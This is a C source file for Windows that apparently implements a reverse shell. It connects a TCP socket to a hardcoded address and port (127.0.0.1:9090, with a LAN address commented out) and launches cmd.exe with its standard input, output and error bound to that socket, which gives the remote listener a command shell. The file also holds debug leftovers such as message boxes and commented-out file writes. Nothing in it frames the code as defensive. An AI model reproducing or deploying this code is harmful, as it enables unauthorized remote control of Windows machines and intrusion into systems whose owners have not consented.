#include <winsock2.h>
#include <stdio.h>


#define IP		"127.0.0.1"
//#define IP		"192.168.0.2"
#define PORT	9090

int APIENTRY WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine, int nCmdShow)
{
	
	WSADATA wsaData;
	STARTUPINFOA  si= {0};
	PROCESS_INFORMATION pi = {0};

	SOCKET hSock;
	SOCKADDR_IN hAddr;
	
	si.cb = sizeof(si);
	
	
	
	//GetStartupInfo(&si);
	
	

	if( WSAStartup(MAKEWORD(2,2),&wsaData) != 0)	
		return 0;

	
	//hSock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
	hSock = socket(AF_INET,SOCK_STREAM,0);
	
	

	
	si.hStdInput = (HANDLE)hSock;
	si.hStdOutput = (HANDLE)hSock;	
	si.hStdError= (HANDLE)hSock;
	si.dwFlags = STARTF_USESTDHANDLES;

	

	
	
	if(hSock == INVALID_SOCKET)	goto exit;
	

	memset(&hAddr,0,sizeof(hAddr));
	hAddr.sin_family = AF_INET;
	hAddr.sin_addr.s_addr = inet_addr(IP);
	hAddr.sin_port = htons(PORT);

	/*
	if( WSAConnect(hSock,(const sockaddr*)&hAddr,sizeof(hAddr),NULL,NULL,NULL,NULL) == SOCKET_ERROR )
		goto exit;

		*/

	if( connect(hSock,(const sockaddr*)&hAddr,sizeof(hAddr)) == SOCKET_ERROR )
		goto exit;

	//char test_buf[] = "hello world";
	//WriteFile( (HANDLE)hSock, test_buf, 10, (DWORD*)test_buf, NULL );
	//HANDLE hFile = CreateFileA("kim.txt",FILE_GENERIC_WRITE,0,NULL,CREATE_NEW,0,NULL);
	
	//si.hStdOutput = hFile;
	//si.hStdInput = hFile;

	if( CreateProcessA("c:\\windows\\system32\\cmd.exe",NULL,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi) == 0)
	{
		DWORD dwError = GetLastError();
		MessageBoxA(0,"AA","AA",0);
		return 0;
	}

	
	MessageBoxA(0,"","",0);
//	CloseHandle(hFile);
	


exit:
	closesocket(hSock);
	WSACleanup();

		

	return 0;
}

